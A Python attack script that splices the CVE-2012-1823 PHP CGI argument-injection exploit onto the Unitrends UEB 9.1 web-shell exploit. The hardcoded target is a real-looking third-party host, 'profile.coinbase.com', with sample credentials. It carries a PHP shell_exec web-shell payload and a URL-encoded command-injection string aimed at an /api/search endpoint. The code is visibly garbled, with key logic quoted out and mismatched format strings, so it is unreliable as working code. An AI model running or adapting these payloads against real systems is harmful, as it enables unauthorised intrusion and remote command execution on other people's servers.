######################################################################################
# Exploit Title: Cve-2012-1823 PHP CGI Argument Injection Exploit
# Date: May 4, 2012
# Author: rayh4c[0x40]80sec[0x2e]com
# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com
######################################################################################
'''
import socket
import sys

def cgi_exploit():
        pwn_code = """<?php system('uname -a');die(); ?>"""
        post_Length = len(pwn_code)
        http_raw="""POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: %s

%s
""" %(HOST , post_Length ,pwn_code)
        print(http_raw)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, int(PORT)))
            sock.send(http_raw)
            data = sock.recv(10000)
            print(repr(data))
            sock.close()
        except (socket.error,msg):
            sys.stderr.write("[ERROR] %s\n" % msg[1])
            sys.exit(1)

if __name__ == '__main__':
        try:
            HOST = sys.argv[1]
            PORT = sys.argv[2]
            cgi_exploit()
        except IndexError:
            print('[+]Usage: cgi_test.py site.com 80')
            sys.exit(-1)
'''


import httplib
import urllib
import ssl
import sys
import base64
import random
import time
import string
import json
from optparse import OptionParser

# Print some helpful words:
print """
###############################################################################
Authenticated lowpriv RCE for Unitrends UEB 9.1
Tested against appliance versions:
  [+] 9.1.0-2.201611302120.CentOS6

This exploit utilizes some issues in UEB9 session handling to place a
php exec one liner in the webroot of the appliance.

Session tokens looks like this:

djA6NmM0ZWMzYTEtZmYwYi00MTIxLTk3YzYtMjQzODljM2EyNjY1OjE6L3Vzci9icC9sb2dzLmRpci9ndWlfcm9vdC5sb2c6MA==

and decodes to this:
                                                            LOG_LVL ----,
   v --- UUID ----------------------- v   v -- LOG_DIR -----------v     v
v0:6c4ec3a1-ff0b-4121-97c6-24389c3a2665:1:/usr/bp/logs.dir/gui_root.log:0

The general steps that are followed by this poc are:

1. Authenticate as a low priv user and receive an auth token.
2. Modify the LOG_DIR field to point to a directory in the web root
   with apache user write access, and make a request to an arbitrary resource.
   This should touch a new file at the desired location.
3. Replace the UUID token in this auth token with a php shell_exec on liner,
   and modify the LOG_LVL parameter to a value of 5, which will ensure
   that the UUID is reflected into the log file.
4. Issue a final request, to generate a shell.php file with a single shell_exec.
   This step is not strictly necessary.
###############################################################################
"""

# Disable SSL Cert validation
if hasattr(ssl, '_create_unverified_context'):
            ssl._create_default_https_context = ssl._create_unverified_context
'''
# Parse command line args:
usage = "Usage: %prog -r <appliance_ip> -u <username> -p <password>\n"\

parser = OptionParser(usage=usage)
parser.add_option("-r", '--RHOST', dest='rhost', action="store",
          help="Target host w/ UNITRENDS UEB installation")
parser.add_option("-u", '--username', dest='username', action="store",
          help="User with any amount of privilege on unitrends device")
parser.add_option("-p", '--password', dest='password', action="store",
          help="password for this user")

(options, args) = parser.parse_args()

if not options.rhost:
  parser.error("[!] No remote host specified.\n")

elif options.rhost is None or options.username is None or options.password is None:
  parser.print_help()
  sys.exit(1)
'''
RHOST = 'profile.coinbase.com'
username = 'ibrahim'
password = 'ali'

################################################################
# REQUEST ONE: GET A UUID.
################################################################

url1 = '/'

a = {"username" : username,
     "password" : password}

post_body = json.dumps(a)

headers1 = {'Host' : RHOST}

print "[+] Attempting to log in to {0}, {1}:{2}".format(RHOST, username, password)

conn = httplib.HTTPSConnection(RHOST, 443)
conn.set_debuglevel(0)
conn.request("GET", url1, post_body, headers=headers1)
r1 = conn.getresponse()

################################################################
# BUILD THE AUTH TOKENS THAT WE'LL USE IN AN ATTACK.
################################################################

parsed_json = r1.read()
#print(parsed_json)
'''
if 'auth_token' not in parsed_json:
  print "[!] Didn't receive an auth token. Bad creds?"
  exit()
'
auth_encoded = parsed_json#['auth_token']
auth_decoded = base64.b64decode(auth_encoded)
uuid = auth_decoded.split(':')[1]
ssid = auth_decoded.split(':')[2]
'''
# We'll place our command shell in /var/www/html/tempPDF, since apache
# has rw in this dir.

log_dir = "/var/www/html/tempPDF/"
log_file = ''.join(random.choice(string.ascii_lowercase) for _ in range(5)) + '.php'
log_lvl = "5"
shell = "<?php echo shell_exec($_GET['cmd']);?> >"
'''
auth_mod1 = "v0:{0}:{1}:{2}{3}:{4}".format( log_dir, log_file, log_lvl)#uuid, ssid, log_dir, log_file, log_lvl)
auth_mod2 = "v0:{0}:{1}:{2}{3}:{4}".format(shell, log_dir, log_file, log_lvl)#(shell, ssid, log_dir, log_file, log_lvl)

auth_mod1 = base64.b64encode(auth_mod1)
auth_mod2 = base64.b64encode(auth_mod2)
'''
url2 = '/'

################################################################
# REQUEST 2: PUT A FILE
################################################################

print "[+] Making a request to place log to http://{0}/tempPDF/{1}".format(RHOST, log_file)

headers2 = {'Host' : RHOST}

# touch the file
conn.request("GET", url2, headers=headers2)
r2 = conn.getresponse()
#parsed_json = r2.read()
#print(parsed_json)

print "[+] Making request to reflect shell_exec php to {0}.".format(log_file)

headers3 = {'Host' : RHOST}

# make the first command
time.sleep(.5)
conn.request("GET", url2, headers=headers3)
conn.close()

# optional cleanup time

print "[+] Making a request to generate clean shell_exec at http://{0}/tempPDF/shell.php".format(RHOST)

url4 = '/api/search?query=%252%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23%27%20%7Cping%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23%5C%22%20%7Cping%20-n%2021%20127.0.0.1' + log_file
url4 += '?query=%252%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23%27%20%7Cping%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23%5C%22%20%7Cping%20-n%2021%20127.0.0.1'

conn1 = httplib.HTTPSConnection(RHOST, 443)
conn1.request("GET", url4, headers=headers2)
r3 = conn1.getresponse()
parsed_json = r3.read()
print(parsed_json)
conn1.close()


url5 = "/"
print "[+] Checking for presence of http://{0}{1}".format(RHOST, url5)
headers3 = {'Host' : RHOST}

conn2 = httplib.HTTPSConnection(RHOST, 443)
conn2.request("GET", url5, headers=headers2)
r3 = conn2.getresponse()

if r3.status == 200:
  print "[+] Got a 200 back. We did it."
  print "[+] Example cmd: http://{0}{1}?cmd=id".format(RHOST, url5)
else:
  print "Got a {0} back. Maybe this didn't work.".format(r3.status)
  print "Try RCE here http://{0}/tempPDF/{1}?cmd=id".format(RHOST, log_file)

conn2.close()